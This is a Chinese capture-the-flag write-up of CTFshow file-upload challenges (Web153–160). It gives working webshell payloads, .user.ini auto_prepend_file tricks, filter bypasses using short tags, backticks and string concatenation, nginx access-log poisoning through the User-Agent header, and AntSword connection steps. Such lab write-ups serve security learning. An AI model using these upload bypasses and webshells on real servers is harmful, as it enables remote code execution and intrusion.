# CTFshow 文件上传

**题目范围：Web151 - Web170**



## Web 153 .user.ini

这个题有必要写一写WP，在修改了前端，并且Burp拦截修改MIME之后，.php依旧是传不上去。

那就用.user.ini，其内容是`auto_prepend_file=yi.png`，然后依旧是改前端，改MIME，将这个文件上传了上去。第二步就是上传yi.png（图片马），这个就是png，也没什么好改的。

**注意！**这之后蚁剑连接的不应该是yi.png，也不是yi.php，而应该是.user.ini目录下的任何一个php文件，所以我们连接 index.php

**关于.user.ini：**`.user.ini`使用范围很广，不仅限于 Apache 服务器，同样适用于 Nginx 服务器，只要服务器启用了 fastcgi 模式 (通常非线程安全模式使用的就是 fastcgi 模式)。

**局限：**在.user.ini中使用这条配置也说了是在同目录下的其他.php 文件中包含配置中所指定的文件，也就是说需要该目录下存在.php 文件，通常在文件上传中，一般是专门有一个目录用来存在图片，可能小概率会存在.php 文件。

但是有时可以使用 ../ 来将文件上传到其他目录，达到一个利用的效果。





## Web 154

相对于上一关来说，过滤了php，我们可以大写绕过，也可以使用php短标签。

但是问题是，我是看了WP才知道的啊……（流汗黄豆）这该咋办。





## Web 156

这关更离谱，过滤了`[]`，所以我们只能用花括号替代中括号，一句话木马就只能是

`<?= @eval($_POST{'a'});?>`

这不看WP怎么会知道啊。





## Web 157-158

越来越离谱了，这一关过过滤了`php`、`[]`、`{}`、`;`。

但是我们还是可以执行任意php语句呀，只是没办法上传php了而已。所以还是先上传.user.ini，然后上传图片的内容应该是`<?=system('ls ../')?>`。

或者直接`<?=system(tac ../fla*)?> `

但是会报错“**Parse error**:  syntax error, unexpected '.' in **/var/www/html/upload/yi.png** on line **1**”

那我们就稍稍修改一下，`<?=system("tac ../fl*")?>`





## Web 159

 本题过滤掉了`php`、`{}`、`[]`、`;`、`()`。

所以就无法调用所有的函数了，但是能利用php特性，命令执行可以用``（反引号包涵）

```php
<?=`nl ../fl*`?>
<?=`tac ../fl*`?>
```





## Web 160

> 在不同的系统，存放日志文件地方和文件名不同
>
> **apache**一般是/var/log/apache/access.log
>
> **nginx**的log在/var/log/nginx/access.log和/var/log/nginx/error.log
>
> 由于访问URL时访问URL时，服务器会对其编码，所以得通过抓包的形式尝试注入
>



添加了日志包含，nginx的日志在`/var/log/nginx/access.log`，同时过滤了`log`，用句点.拼接

`<?=include"/var/lo"."g/nginx/access.lo"."g"?>`

这里要两次包含，首先.user.ini包含木马php，再上传木马php包含日志，同时UA头更改成tac语句：`<?php @eval($_POST['a']);?>`



这个题详细说一下吧，先改前端，将合法后缀改成`ini`，然后打开拦截，上传`.user.ini`，然后在Burp中修改MIME为`image/png`，内容：`auto_prepend_file=yi.png`，然后再改前端，改成png，然后上传`yi.png`，内容：`<?=include"/var/lo"."g/nginx/access.lo"."g"?>`，上传png的同时拦截修改UA为`<?php @eval($_POST['a']);?>`，然后就OK了，蚁剑连接`URL/uypload/index.php`或者直接`URL/uypload/`就行了。
